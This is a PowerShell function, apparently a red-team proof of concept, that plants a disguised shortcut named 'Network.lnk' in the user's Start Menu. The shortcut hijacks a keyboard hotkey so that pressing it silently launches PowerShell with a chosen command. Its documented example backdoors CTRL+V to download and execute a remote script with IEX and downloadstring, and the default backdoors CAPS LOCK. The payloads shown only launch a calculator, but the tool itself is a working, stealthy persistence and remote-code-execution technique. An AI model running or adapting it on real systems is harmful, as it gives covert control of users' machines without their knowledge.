Function HotkeyHijack {

    <#

    .SYNOPSIS

    Creates a shortcut file (.LNK) in the current user's start menu folder.
    Hijacks given hotkey to run specified command.

    .PARAMETER HotKey

    Specifies the hotkey to hijack.

    .PARAMETER Command

    Specifies the command to execute.

    .EXAMPLE
    
    By default, "CAPS LOCK" is backdoored to launch calculator. The "HotKey" parameter can be specified to execute a custom command.
    Shown below is the command to backdoor "CTRL+V" to fetch a remote script - in this case, runs calculator.
    HotkeyHijack -HotKey "CTRL+V" -Command "IEX([net.webclient]::new().downloadstring('https://raw.githubusercontent.com/huntr-huntr/Cache/main/scripts/calc.txt'))"

    .NOTES
    
    More details at https://huntr.sh/hijacking-hotkeys/

    #>

    Param (
        [Parameter(Mandatory = $False)]
        [String] $HotKey = "Captial",
        [String] $Command = '[Reflection.Assembly]::LoadWithPartialName(''System.Windows.Forms''); [Windows.Forms.SendKeys]::SendWait(\"^{CAPSLOCK}\"); Calc'
        )

    $outfile = "$env:UserProfile\Appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Network.lnk"
    $wShell = New-Object -ComObject Wscript.Shell
    $lnk = $wShell.CreateShortcut($outfile)
    $lnk.IconLocation = "shell32.dll,18"
    $lnk.WindowStyle = "7"
    $lnk.TargetPath = "powershell"
    $lnk.Arguments = "$Command"
    $lnk.HotKey = "$HotKey"
    $lnk.Save()

}
